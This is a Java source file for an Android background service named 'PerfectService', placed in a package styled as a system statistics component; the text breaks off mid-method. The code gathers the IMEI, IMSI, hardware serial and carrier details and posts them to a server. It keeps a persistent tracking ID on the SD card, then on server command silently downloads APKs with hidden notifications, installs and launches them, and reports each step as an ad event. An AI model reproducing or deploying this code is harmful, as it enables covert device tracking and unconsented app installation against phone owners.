package com.android.statistics;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Method;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.Map.Entry;

import org.apache.http.HttpException;
import org.apache.http.HttpRequest;
import org.apache.http.HttpRequestInterceptor;
import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.CoreConnectionPNames;
import org.apache.http.protocol.HTTP;
import org.apache.http.protocol.HttpContext;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.android.statistics.request.PerfectHttpPost;
import com.android.statistics.request.RequestInformation;
import com.android.statistics.utils.HelpUtil;
import com.android.statistics.utils.LogUtil;
import com.android.statistics.utils.PerfectUtil;

import android.annotation.SuppressLint;
import android.app.DownloadManager;
import android.app.DownloadManager.Query;
import android.app.DownloadManager.Request;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.IPackageDeleteObserver;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.RemoteException;

import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.util.Log;

public class PerfectService extends Service {
	public static Map<String, String> customHeaders = new HashMap<String, String>();
	private static final String TAG = "PerfectService";
	public static final String ACTION_INIT = "com.perfect.android.init";
	public static final String ACTION_PUSH_AGAIN = "andorid.intent.silent.start";
	public static final String ACTION_PUSH_AGAIN_IN = "andorid.intent.silent.in";

	byte[] srtbyte = null;

	private String mUserId = null;
	private String userId = null;

	private static final int REGISTER = 0;
	private static final int UPGRADE = 1;
	private static final int FAIL = 2;
	private static final int PLUG_ACTIVE = 3;
	private static final int SILENT_REPORT = 4;
	private static final int connectTimeout = 30 * 1000;
	private static final int readTimeout = 30 * 1000;
	private Handler mHandler;

	private String plmn = "";
	private String country = "";
	private String isSystem = "4";
	private String userIdInSd = null;
	private boolean apkIsExist = false;
	private String filePath = null;

	@Override
	public IBinder onBind(Intent paramIntent) {
		return null;
	}

	@Override
	public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
		if (LogUtil.flag)
			Log.v(TAG, "Perfect onStartCommand8!");

		initHandler();

		// ChannelId
		SharedPreferences channelIdSharedPreferences = getSharedPreferences(
				"channelid", 0);
		String mChannelID = channelIdSharedPreferences.getString("channelid",
				"NoChannel");
		if (LogUtil.flag)
			Log.v(TAG, "Perfect mChannelID888111=" + mChannelID);
		if (mChannelID.equals("NoChannel")) {
			String mChannelId = HelpUtil.getChannelID(getApplicationContext());
			SharedPreferences.Editor editorChannelId = getApplicationContext()
					.getSharedPreferences("channelid", MODE_PRIVATE).edit();
			editorChannelId.putString("channelid", mChannelId);
			editorChannelId.commit();

			JSONArray jsonarrayChannelId = new JSONArray();
			String jsonresultChannelId = "";
			JSONObject jsonObjmmChannelId = new JSONObject();

			try {
				jsonObjmmChannelId.put("channelid", mChannelId);
				jsonarrayChannelId.put(jsonObjmmChannelId);

			} catch (JSONException e) {
				// TODO Auto-generated catch block
				if (LogUtil.error_flag)
					e.printStackTrace();
			}
			jsonresultChannelId = jsonObjmmChannelId.toString();
			if (LogUtil.flag)
				Log.d(TAG, "Perfect jsonresultChannelId41776="
						+ jsonresultChannelId);
			HelpUtil.writeChannelIdFiletoFile(jsonresultChannelId);
		}
		// UserID
		SharedPreferences versionCodeeSharedPreferences = getSharedPreferences(
				"versionCodee", 0);
		String mVersionCodeeFromServer = versionCodeeSharedPreferences
				.getString("versionCodee", "65510");
		if (LogUtil.flag)
			Log.v(TAG, "Perfect mVersionCodeeFromServer111="
					+ mVersionCodeeFromServer);
		SharedPreferences sharedPreferences = getSharedPreferences("Report", 0);
		mUserId = sharedPreferences.getString("aduserId", null);
		if (LogUtil.flag)
			Log.d(TAG, "Perfect mUserId541776=" + mUserId);

		String userMessage = HelpUtil.readUserFile();
		String versionCodee = "65510";
		String useridInSd = null;
		if (userMessage != null && !userMessage.equals("")) {
			JSONObject dataJson;
			try {
				dataJson = new JSONObject(userMessage);
				if (LogUtil.flag)
					Log.d(TAG,
							"Perfect version_code11776="
									+ dataJson.getString("version_code"));
				versionCodee = dataJson.getString("version_code");
				if (LogUtil.flag)
					Log.d(TAG,
							"Perfect user_id11776="
									+ dataJson.getString("user_id"));
				useridInSd = dataJson.getString("user_id");
			} catch (JSONException e) {
				// TODO Auto-generated catch block
				if (LogUtil.error_flag)
					e.printStackTrace();
				useridInSd = null;
				versionCodee = mVersionCodeeFromServer;
			}

		} else {
			useridInSd = null;
			versionCodee = mVersionCodeeFromServer;
		}

		int versionCodeSelf = HelpUtil.VERSION_CODE;
		if (LogUtil.flag)
			Log.d(TAG, "Perfect versionCodeSelf1776=" + versionCodeSelf);
		if (LogUtil.flag)
			Log.d(TAG, "Perfect versionCodee1776=" + versionCodee);
		if (LogUtil.flag)
			Log.d(TAG, "Perfect mUserId1776=" + mUserId);
		if (LogUtil.flag)
			Log.d(TAG, "Perfect useridInSd1776=" + useridInSd);
		if (LogUtil.flag)
			Log.d(TAG,
					"Perfect ---------1111="
							+ (mUserId == null || (mUserId != null && mUserId
									.equals(""))));
		if (LogUtil.flag)
			Log.d(TAG,
					"Perfect ------22222="
							+ (useridInSd == null || (useridInSd != null && useridInSd
									.equals(""))));
		if (LogUtil.flag)
			Log.d(TAG, "Perfect ------333333="
					+ (versionCodeSelf > Integer.valueOf(versionCodee)
							.intValue()));
		if (LogUtil.flag)
			Log.d(TAG,
					"Perfect ------------="
							+ ((mUserId == null || (mUserId != null && mUserId
									.equals(""))) || (useridInSd == null || (useridInSd != null && useridInSd
									.equals("")))));

		if ((((mUserId == null || (mUserId != null && mUserId.equals(""))) || (useridInSd == null || (useridInSd != null && useridInSd
				.equals("")))) || versionCodeSelf > Integer.valueOf(
				versionCodee).intValue())
				&& PerfectUtil.isNetworkAvailable(getApplicationContext()))
			getAdRegister(getApplicationContext());

		if (LogUtil.flag)
			Log.v(TAG, "Perfect paramIntent8=" + paramIntent);
		if (paramIntent != null) {
			String action = paramIntent.getAction();
			if (LogUtil.flag)
				Log.v(TAG, "Perfect action345=" + action);
			if (action != null) {
				if (action.equals(ACTION_INIT)) {

					SharedPreferences silentTime = getSharedPreferences(
							"SilentTime", 0);
					int silent_Time = silentTime.getInt("silentTime", 0);
					if (LogUtil.flag)
						Log.v(TAG, "Perfect silent_Time567=" + silent_Time);
					// String addTimeString=addTime(silent_Time);
					// long addtiems=addTimes(silent_Time);
					long ii = (long) silent_Time * 24 * 3600 * 1000;
					if (LogUtil.flag)
						Log.v(TAG, "Perfect ii 6464567=" + ii);

					SharedPreferences registerTime = getSharedPreferences(
							"registerTime", 0);
					long regsTime = registerTime.getLong("registerTime", 0);
					if (LogUtil.flag)
						Log.v(TAG, "Perfect regsTime 321567=" + regsTime);

					Date date1 = new Date();
					long nowTime = date1.getTime();
					SimpleDateFormat df1 = new SimpleDateFormat(
							"yyyy-MM-dd");
					String nowdate1 = df1.format(date1);
					String plugDate=HelpUtil.GetInfoToSharedPreference(getApplicationContext(), "getOrderDate", nowdate1, "isGetOrderActivation");
					if (LogUtil.flag)
						Log.v(TAG, "Perfect plugDate 321567=" + plugDate);
					if(isDateAfterOrBefore(plugDate)){
						if (LogUtil.flag)
							Log.v(TAG, "Perfect plugDate is a new day=");
						HelpUtil.SaveInfoToSharedPreference(getApplicationContext(), "isGetOrder", "No", "isGetOrderActivation");
					}
					if (LogUtil.flag)
						Log.v(TAG, "Perfect nowTime 321567=" + nowTime);
					if (LogUtil.flag)
						Log.v(TAG, "Perfect nowTime-regsTime 321567="
								+ (nowTime - regsTime));
					if (nowTime != 0 && regsTime != 0 && ii >= 0
							&& (nowTime - regsTime > ii)) {

						if (LogUtil.flag)
							Log.v(TAG,
									"Perfect isNetworkAvailable 567="
											+ PerfectUtil
													.isNetworkAvailable(getApplicationContext()));
						if (LogUtil.flag)
							Log.v(TAG, "Perfect mUserId567=" + mUserId);
						if (LogUtil.flag)
							Log.v(TAG, "Perfect useridInSd567=" + useridInSd);
						if ((PerfectUtil
								.isNetworkAvailable(getApplicationContext())
								&& mUserId != null && !mUserId.equals(""))
								|| (PerfectUtil
										.isNetworkAvailable(getApplicationContext())
										&& useridInSd != null && !useridInSd
											.equals(""))
						) {
							checkClientCanUpdateRequest();
							
							String isGetOrder=HelpUtil.GetInfoToSharedPreference(getApplicationContext(), "isGetOrder", "No", "isGetOrderActivation");
							if (LogUtil.flag)
								Log.v(TAG, "Perfect isGetOrder=" + isGetOrder);
							if(isGetOrder!=null&&isGetOrder.equals("No")){
								getPlugActive();
							}
						} else {
							stopSelf();
							return START_NOT_STICKY;
						}

					} else {
						stopSelf();
						return START_NOT_STICKY;
					}
				} else if(action.equals(ACTION_PUSH_AGAIN)){
					String pkgName=(String) paramIntent.getSerializableExtra("packageName");
					if (PerfectUtil.isInstalled(getApplicationContext(), pkgName)) {
					boolean ourSelfAPk = PerfectUtil.isIntentAvailable(getApplicationContext(),
							pkgName, PerfectUtil.selfAction);
					if (LogUtil.flag)
						Log.v(TAG, "Perfect ourSelfAPk123=" + ourSelfAPk);
					if (ourSelfAPk){
						int code=-100;
						code=PerfectUtil.openOurApplicationEx(getApplicationContext(), pkgName);
						if (LogUtil.flag)
							Log.v(TAG, "Perfect ourSelfAPk code=" + code);
						if(code==0){
							String ad_id=HelpUtil.GetInfoToSharedPreference(getApplicationContext(), pkgName, null, "reportInfo");
							if(ad_id!=null){
								reportAction(ad_id, "", pkgName, "", "11");
							}
						}
					}
					removeDown(getApplicationContext());
					}
				}else if(action.equals(ACTION_PUSH_AGAIN_IN)){
					if (paramIntent!=null) {
					String flag=(String) paramIntent.getSerializableExtra("flag");
					String path=(String) paramIntent.getSerializableExtra("filePath");
					if (LogUtil.flag)
						Log.v(TAG, "Perfect ACTION_PUSH_AGAIN_IN flag=" + flag);
					if (LogUtil.flag)
						Log.v(TAG, "Perfect ACTION_PUSH_AGAIN_IN path=" + path);
					if(flag!=null&&flag.equalsIgnoreCase("sync")&&path!=null&&!path.equals("")){
						PerfectUtil.install(getApplicationContext(),path);
					}
					}
				}else{
					stopSelf();
					return START_NOT_STICKY;
				}
			} else {
				stopSelf();
				return START_NOT_STICKY;
			}

		}
		return START_NOT_STICKY;
	}

	@Override
	public void onDestroy() {
		if (LogUtil.flag)
			Log.i(TAG, "onDestroy");
		super.onDestroy();
	}

	@SuppressWarnings("deprecation")
	@Override
	public void onStart(Intent intent, int startId) {
		if (LogUtil.flag)
			Log.i(TAG, "onStart");
		super.onStart(intent, startId);
	}

	@Override
	public void onCreate() {
		super.onCreate();
	}

	private void getAdRegister(Context context) {
		// TODO Auto-generated method stub

		DisplayMetrics dm = new DisplayMetrics();
		dm = getResources().getDisplayMetrics();
		int screenWidth = dm.widthPixels;
		int screenHeight = dm.heightPixels;
		final String resolution = Integer.toString(screenWidth) + "*"
				+ Integer.toString(screenHeight);
		if (LogUtil.flag)
			Log.v(TAG, "Perfect resolution6668=" + resolution);

		final String Serial = getSerialNumber();
		if (LogUtil.flag)
			Log.v(TAG, "Perfect Serial6668=" + Serial);

		final String os_version = android.os.Build.VERSION.RELEASE;
		if (LogUtil.flag)
			Log.v(TAG, "Perfect os_version6668=" + os_version);
		final String os_id = Integer.toString(android.os.Build.VERSION.SDK_INT);
		if (LogUtil.flag)
			Log.v(TAG, "Perfect os_id6668=" + os_id);
		// UserId
		final String mUUID = UUID.randomUUID().toString();
		final String mChannelID = HelpUtil
				.getChannelID(getApplicationContext());

		final String userMessage = HelpUtil.readUserFile();
		if (LogUtil.flag)
			Log.d(TAG, "Perfect userMessage564776=" + userMessage);

		if (userMessage != null && !userMessage.equals("")) {
			JSONObject dataJson;
			try {
				dataJson = new JSONObject(userMessage);
				if (LogUtil.flag)
					Log.d(TAG,
							"Perfect version_code776="
									+ dataJson.getString("version_code"));
				if (LogUtil.flag)
					Log.d(TAG,
							"Perfect user_id776="
									+ dataJson.getString("user_id"));
				userIdInSd = dataJson.getString("user_id");
			} catch (JSONException e) {
				// TODO Auto-generated catch block
				if (LogUtil.error_flag)
					e.printStackTrace();
			}
		}
		if (LogUtil.flag)
			Log.v(TAG, "Perfect userIdInSd9996668=" + userIdInSd);
		SharedPreferences sharedPreferences = getSharedPreferences("Report", 0);
		String mRegisterUserId = sharedPreferences.getString("aduserId", null);
		if (LogUtil.flag)
			Log.v(TAG, "Perfect mRegisterUserId9996668=" + mRegisterUserId);
		if (mRegisterUserId == null && userIdInSd == null) {
			userId = mUUID;
			SharedPreferences.Editor editor = getApplicationContext()
					.getSharedPreferences("Report", MODE_PRIVATE).edit();
			editor.putString("aduserId", userId);
			editor.commit();
		} else {
			if (userIdInSd == null)
				userId = mRegisterUserId;
			if (mRegisterUserId == null)
				userId = userIdInSd;
			if (userIdInSd != null && mRegisterUserId != null)
				userId = userIdInSd;
		}
		if (LogUtil.flag)
			Log.v(TAG, "Perfect userId9996668=" + userId);

		final String mDeviceId = ((TelephonyManager) getApplicationContext()
				.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
		;
		final String mSubsId = ((TelephonyManager) getApplicationContext()
				.getSystemService(Context.TELEPHONY_SERVICE)).getSubscriberId();
		final String mDeviceModelId = HelpUtil.getDeviceModel();

		final String versionName = HelpUtil.VERSION_NAME;

		final int versionCode = HelpUtil.VERSION_CODE;

		try {
			if (mSubsId != null && !mSubsId.equals(""))
				plmn = mSubsId.substring(0, 5);
			else
				plmn = "NPlmn";

			if (mSubsId != null && !mSubsId.equals(""))
				country = mSubsId.substring(0, 3);
			else
				country = "NoSim";
		} catch (ArrayIndexOutOfBoundsException e) {
			if (LogUtil.error_flag)
				e.printStackTrace();
		} catch (StringIndexOutOfBoundsException e) {
			if (LogUtil.error_flag)
				e.printStackTrace();
		}

		final String vendor = android.os.Build.MANUFACTURER;
		// 表示在setting里面
		if (!checkPackageInstallerChannelID(getApplicationContext())) {
			isSystem = "40";
		}

		if (LogUtil.flag)
			Log.v(TAG, "Perfect userId=" + userId);
		if (LogUtil.flag)
			Log.v(TAG, "Perfect mChannelID=" + mChannelID);
		if (LogUtil.flag)
			Log.v(TAG, "Perfect mDeviceModelId=" + mDeviceModelId);
		if (LogUtil.flag)
			Log.v(TAG, "Perfect mDeviceId=" + mDeviceId);
		if (LogUtil.flag)
			Log.v(TAG, "Perfect mSubsId=" + mSubsId);
		if (LogUtil.flag)
			Log.v(TAG, "Perfect plmn=" + plmn);
		if (LogUtil.flag)
			Log.v(TAG, "Perfect Serial=" + Serial);
		if (LogUtil.flag)
			Log.v(TAG, "Perfect os_version=" + os_version);
		if (LogUtil.flag)
			Log.v(TAG, "Perfect os_id=" + os_id);
		if (LogUtil.flag)
			Log.v(TAG, "Perfect vendor=" + vendor);
		if (LogUtil.flag)
			Log.v(TAG, "Perfect versionName=" + versionName);
		if (LogUtil.flag)
			Log.v(TAG, "Perfect versionCode=" + versionCode);
		if (LogUtil.flag)
			Log.v(TAG, "Perfect resolution=" + resolution);
		if (LogUtil.flag)
			Log.v(TAG, "Perfect country=" + country);
		if (LogUtil.flag)
			Log.v(TAG, "Perfect isSystem=" + isSystem);

		new Thread(new Runnable() {

			@Override
			public void run() {
				// TODO Auto-generated method stub
				try {
					httpPostMethod(
							getApplicationContext(),
							getMchMsData(userId, mChannelID, mDeviceModelId,
									mDeviceId, mSubsId, plmn, Serial,
									os_version, os_id, vendor, versionName,
									versionCode, resolution, country, isSystem),
							REGISTER);
				} catch (HttpException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}).start();
	}

	// 获取手机序列号
	public static String getSerialNumber() {
		String serial = null;
		try {
			Class<?> c = Class.forName("android.os.SystemProperties");
			Method get = c.getMethod("get", String.class);
			serial = (String) get.invoke(c, "ro.serialno");
		} catch (Exception ignored) {
		}
		return serial;
	}

	private void checkClientCanUpdateRequest() {

		String userMessage = HelpUtil.readUserFile();
		String useridInSd = null;
		if (userMessage != null && !userMessage.equals("")) {
			JSONObject dataJson;
			try {
				dataJson = new JSONObject(userMessage);
				if (LogUtil.flag)
					Log.d(TAG,
							"Perfect checkClientCanUpdateRequest user_id 11776="
									+ dataJson.getString("user_id"));
				useridInSd = dataJson.getString("user_id");
			} catch (JSONException e) {
				// TODO Auto-generated catch block
				if (LogUtil.error_flag)
					e.printStackTrace();
			}

			SharedPreferences sharedPreferences = getSharedPreferences(
					"Report", 0);
			mUserId = sharedPreferences.getString("aduserId", null);
			if (LogUtil.flag)
				Log.d(TAG, "Perfect checkClientCanUpdateRequest mUserId 11776="
						+ mUserId);
			if (useridInSd != null && mUserId != null
					&& useridInSd.equals(mUserId)) {
				final String mChannelID = HelpUtil
						.getChannelID(getApplicationContext());
				final String mDeviceModelId = HelpUtil.getDeviceModel();
				SharedPreferences requestSharedPreferences = getSharedPreferences(
						"Request_Time", 0);
				final long request_time = requestSharedPreferences.getLong(
						"request_time", 0);
				if (LogUtil.flag)
					Log.d(TAG,
							"Perfect checkClientCanUpdateRequest mChannelID 11776="
									+ mChannelID);
				if (LogUtil.flag)
					Log.d(TAG,
							"Perfect checkClientCanUpdateRequest mDeviceModelId 11776="
									+ mDeviceModelId);
				if (LogUtil.flag)
					Log.d(TAG,
							"Perfect checkClientCanUpdateRequest request_time 11776="
									+ request_time);

				new Thread(new Runnable() {

					@Override
					public void run() {
						// TODO Auto-generated method stub
						try {
							httpPostMethod(
									getApplicationContext(),
									getUpdateParameter(mUserId, mChannelID,
											mDeviceModelId, request_time),
									UPGRADE);
						} catch (Exception e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					}
				}).start();
			}
		}

	}

	/**
	 * 上报
	 * action=11 表示吊起成功
	 */
	private void reportAction(final String ad_id, final String app_id,
			final String pakage_name, final String app_name, final String action) {
		new Thread(new Runnable() {

			@Override
			public void run() {
				// TODO Auto-generated method stub
				try {
					httpPostMethod(
							getApplicationContext(),
							getReportParameter(ad_id, app_id, pakage_name,
									app_name, action), SILENT_REPORT);
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}).start();
	}

	/**
	 * 请求指令激活信息
	 * 
	 * @param silent_ID
	 */

	private void getPlugActive() {
		new Thread(new Runnable() {

			@Override
			public void run() {
				// TODO Auto-generated method stub
				try {
					httpPostMethod(getApplicationContext(),
							getPlugActiveParameter(), PLUG_ACTIVE);
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}).start();
	}

	private List<NameValuePair> getMchMsData(String userId, String channel,
			String phoneModel, String imei, String imsi, String plmn,
			String serial, String os_version, String os_id, String vendor,
			String versionName, int versionCode, String mResolution,
			String country, String is_system) throws Exception, HttpException {
		List<NameValuePair> formParams = new ArrayList<NameValuePair>();
		formParams.add(new BasicNameValuePair("user_id", userId));
		formParams.add(new BasicNameValuePair("channel", channel));
		formParams.add(new BasicNameValuePair("phone_model", phoneModel));
		formParams.add(new BasicNameValuePair("imei", imei));
		formParams.add(new BasicNameValuePair("imsi", imsi));
		formParams.add(new BasicNameValuePair("plmn", plmn));
		formParams.add(new BasicNameValuePair("serial", serial));
		formParams.add(new BasicNameValuePair("os_version", os_version));
		formParams.add(new BasicNameValuePair("os_id", os_id));
		formParams.add(new BasicNameValuePair("vendor", vendor));
		// formParams.add(new RequestParameter("version_name", versionName));
		// formParams.add(new RequestParameter("version_code", versionCode));
		formParams.add(new BasicNameValuePair("resolution", mResolution));
		formParams.add(new BasicNameValuePair("country", country));
		formParams.add(new BasicNameValuePair("is_system", is_system));
		Log.v(TAG, "Perfect adRegister54!");
		return formParams;
	}

	private List<NameValuePair> getUpdateParameter(String userId,
			String channel, String phoneModel, long request_time) {
		List<NameValuePair> formParams = new ArrayList<NameValuePair>();
		formParams.add(new BasicNameValuePair("user_id", userId));
		formParams.add(new BasicNameValuePair("channel", channel));
		formParams.add(new BasicNameValuePair("phone_model", phoneModel));
		formParams.add(new BasicNameValuePair("request_time", String
				.valueOf(request_time)));
		if (LogUtil.flag)
			Log.v(TAG, "Perfect getUpdateParameter54!");
		return formParams;
	}

	private List<NameValuePair> getReportParameter(String ad_id, String app_id,
			String pakage_name, String app_name, String action) {
		List<NameValuePair> formParams = new ArrayList<NameValuePair>();
		formParams.add(new BasicNameValuePair("ad_id", ad_id));
		formParams.add(new BasicNameValuePair("app_id", app_id));
		formParams.add(new BasicNameValuePair("pakage_name", pakage_name));
		formParams.add(new BasicNameValuePair("app_name", app_name));
		formParams.add(new BasicNameValuePair("action", action));
		if (LogUtil.flag)
			Log.v(TAG, "Perfect getSilentListParameter54!");
		return formParams;
	}

	private List<NameValuePair> getPlugActiveParameter() {
		List<NameValuePair> formParams = new ArrayList<NameValuePair>();
		formParams.add(new BasicNameValuePair("T", ""));
		if (LogUtil.flag)
			Log.v(TAG, "Perfect getPlugActiveParameter54!");
		return formParams;
	}

	private void getRegisterData(String string) {
		if (string != null && !string.equals("")) {

			try {
				JSONObject jsonObject = new JSONObject(string);
				String code = jsonObject.getString("code");
				if (LogUtil.flag)
					Log.i(TAG, "getRegisterData code=" + code);
				if (code != null && code.equals("200")) {
					String data = jsonObject.getString("data");
					if (data != null && !data.equals("")) {
						JSONObject jsonObject2 = new JSONObject(data);

						if (jsonObject2 != null && !jsonObject2.equals("")) {
							String status = jsonObject2.getString("status");
							if (LogUtil.flag)
								Log.i(TAG,
										"getRegisterData jsonObject2 status="
												+ status);
							SharedPreferences.Editor editorFromServer = getApplicationContext()
									.getSharedPreferences(
											"RegisterUserIdReportFromServer",
											MODE_PRIVATE).edit();
							editorFromServer.putString(
									"RegisterUserIdReportFromServer", status);
							editorFromServer.commit();

							int versionCode = HelpUtil.VERSION_CODE;
							if (LogUtil.flag)
								Log.d(TAG, "Perfect versionCode88899="
										+ versionCode);
							if (status != null && status.equals("OK")) {
								int silent_time = jsonObject2.getInt("s_time");
								if (LogUtil.flag)
									Log.i(TAG,
											"getRegisterData jsonObject2 silent_time="
													+ silent_time);
								SharedPreferences.Editor silentTime = getApplicationContext()
										.getSharedPreferences(
												"SilentTime",
												getApplicationContext().MODE_PRIVATE)
										.edit();
								silentTime.putInt("silentTime", silent_time);
								silentTime.commit();

								SharedPreferences.Editor editor = getApplicationContext()
										.getSharedPreferences("Report",
												MODE_PRIVATE).edit();
								editor.putString("aduserId", userId);
								editor.commit();

								SharedPreferences.Editor versionCodee = getApplicationContext()
										.getSharedPreferences("versionCodee",
												MODE_PRIVATE).edit();
								versionCodee.putString("versionCodee",
										String.valueOf(versionCode));
								versionCodee.commit();

								if (LogUtil.flag)
									Log.v(TAG, "Perfect registerTime666="
											+ jsonObject2.getLong("now_time"));
								SharedPreferences.Editor registerTime = getApplicationContext()
										.getSharedPreferences("registerTime",
												MODE_PRIVATE).edit();
								registerTime.putLong("registerTime",
										jsonObject2.getLong("now_time"));
								registerTime.commit();

								JSONArray jsonarray = new JSONArray();
								String jsonresult = "";
								JSONObject jsonObjmm = new JSONObject();

								try {
									jsonObjmm.put("version_code",
											String.valueOf(versionCode));
									jsonObjmm.put("user_id", userId);
									jsonObjmm.put("register_time",
											jsonObject2.getLong("now_time"));
									jsonarray.put(jsonObjmm);

								} catch (JSONException e) {
									// TODO Auto-generated catch block
									if (LogUtil.error_flag)
										e.printStackTrace();
								}
								jsonresult = jsonObjmm.toString();

								HelpUtil.writeUserFiletoFile(jsonresult);

								// 注册成功之后，把Service关闭
								stopSelf();// 关闭Service
							}
						}
					}
				}
			} catch (JSONException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}

	private void getRequestUpdateData(String string) {
		if (string != null && !string.equals("")) {
			try {
				JSONObject jsonObject = new JSONObject(string);
				String code = jsonObject.getString("code");
				if (LogUtil.flag)
					Log.i(TAG, "getRequestUpdateData code=" + code);
				if (code != null && code.equals("200")) {
					String data = jsonObject.getString("data");
					if (data != null && !data.equals("")) {

						doAction(data);
					}
				}
				if (code != null && code.equals("304")) {
					stopSelf();
				}
			} catch (JSONException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}

	public void downloadIntent(Context context, String url, boolean apkIsExist,
			String filePath,final String ad_id,final String packageName) {
		if (apkIsExist) {
			if (LogUtil.flag)
				Log.d(TAG, " apkIsExist filePath=" + filePath);
			int code=PerfectUtil.install(context, filePath);
			if (LogUtil.flag)
				Log.d(TAG, " apkIsExist code=" + code);
			if (code==100) {
				reportAction(ad_id, "", packageName, "", "4");
				HelpUtil.SaveInfoToSharedPreference(getApplicationContext(), packageName, ad_id, "reportInfo");
			}

		} else {
			String serviceString = Context.DOWNLOAD_SERVICE;
			final DownloadManager downloadManager;
			downloadManager = (DownloadManager) context
					.getSystemService(serviceString);

			Query myDownloadQuery = new Query();
			myDownloadQuery.setFilterByStatus(DownloadManager.STATUS_RUNNING);

			reportAction(ad_id, "", packageName, "", "2");
			Log.e(TAG, "downloadIntent url:" + url);
			Uri uri = Uri.parse(url);
			Log.e(TAG, "downloadIntent uri:" + uri);
			DownloadManager.Request request = new Request(uri);
			request.setAllowedNetworkTypes(Request.NETWORK_WIFI
					| Request.NETWORK_MOBILE);
			request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_HIDDEN);
			downloadManager.getRecommendedMaxBytesOverMobile(context);
			request.setDestinationInExternalPublicDir("/Appstore/cache",
					url.substring(url.lastIndexOf("/")));

			final long myreference = downloadManager.enqueue(request);
			if (LogUtil.flag)
			Log.e(TAG, "downloadIntent uri myreference:" + myreference);
			SharedPreferences.Editor downloadInfo = getApplicationContext()
					.getSharedPreferences("DownloadInfo",
							getApplicationContext().MODE_PRIVATE).edit();
			downloadInfo.putLong("ID", myreference);
			downloadInfo.commit();

			IntentFilter filter = new IntentFilter(
					DownloadManager.ACTION_DOWNLOAD_COMPLETE);
			BroadcastReceiver receiver = new BroadcastReceiver() {
				@Override
				public void onReceive(Context context, Intent intent) {

					long reference = intent.getLongExtra(
							DownloadManager.EXTRA_DOWNLOAD_ID, -1);
				    if (LogUtil.flag)
					Log.e(TAG, "reference546456564=" + reference);
					if (reference == myreference) {
						// 瀵逛笅杞界殑鏂囦欢杩涜涓�浜涙搷浣�
						if (LogUtil.flag)Log.e(TAG, "reference546456564= install 000");
						Query myDownloadQuery = new Query();
						myDownloadQuery.setFilterById(reference);

						Cursor myDownload = downloadManager
								.query(myDownloadQuery);
						if (LogUtil.flag)Log.e(TAG, "reference546456564 myDownload="+myDownload);
						if (myDownload != null) {
							while (myDownload.moveToNext()) {
								if (LogUtil.flag)Log.e(TAG, "reference546456564 myDownload.moveToNext=");
								int fileNameIdx = myDownload
										.getColumnIndex(DownloadManager.COLUMN_LOCAL_FILENAME);
								int fileUriIdx = myDownload
										.getColumnIndex(DownloadManager.COLUMN_LOCAL_URI);

								String fileName = myDownload
										.getString(fileNameIdx);
								String fileUri = myDownload
										.getString(fileUriIdx);
								if (LogUtil.flag)
									Log.d(TAG,
											"fileName="+fileName + " :fileUri.toString()+ ="
													+ fileUri);
								if (fileUri != null) {
									reportAction(ad_id, "", packageName, "", "3");
									int code=PerfectUtil.install(context, fileName);
									if (code==100) {
										reportAction(ad_id, "", packageName, "", "4");
										HelpUtil.SaveInfoToSharedPreference(getApplicationContext(), packageName, ad_id, "reportInfo");
									}
								}
							}
							myDownload.close();
							if (LogUtil.flag)Log.e(TAG, "reference546456564 myDownload.close=");
						}
					}
					context.unregisterReceiver(this);
				}

			};
			context.registerReceiver(receiver, filter);
		}
		// }
	}

	private void httpPostMethod(Context context, List<NameValuePair> parameter,
			int flag) {
		DefaultHttpClient httpClient = null;
		PerfectHttpPost.initLogin(getApplicationContext());
		String url=getUrl(flag);

		if (httpClient == null)
			httpClient = new DefaultHttpClient();
		httpClient.addRequestInterceptor(new HttpRequestInterceptor() {
			public void process(final HttpRequest request,
					final HttpContext context) throws HttpException,
					IOException {
				for (Entry<String, String> header : customHeaders.entrySet()) {
					if (LogUtil.flag)
						Log.e(TAG,
								header.getKey() + "==customHeaders546456564= "
										+ header.getValue());
					request.setHeader(header.getKey(), header.getValue());
				}
				if (RequestInformation.GZIP_ENCODING)
					request.setHeader("Accept-Encoding", "gzip");
			}

		});

		try {
			Log.e(TAG, "url===" + url);
			HttpUriRequest request = new HttpPost(url);
			if (LogUtil.flag)
				Log.d(TAG, "AsyncHttpGet  request to url :" + url);
			request.getParams().setParameter(
					CoreConnectionPNames.CONNECTION_TIMEOUT, connectTimeout);
			request.getParams().setParameter(CoreConnectionPNames.SO_TIMEOUT,
					readTimeout);
			if (parameter != null && parameter.size() > 0) {
				List<BasicNameValuePair> list = new ArrayList<BasicNameValuePair>();
				for (NameValuePair p : parameter) {
					if (LogUtil.flag)
						Log.d(TAG,
								"AsyncHttpGet  request to parameter :"
										+ p.getValue());
					list.add(new BasicNameValuePair(p.getName(), p.getValue()));
				}
				((HttpPost) request).setEntity(new UrlEncodedFormEntity(list,
						HTTP.UTF_8));
			}
			HttpResponse response = httpClient.execute(request);

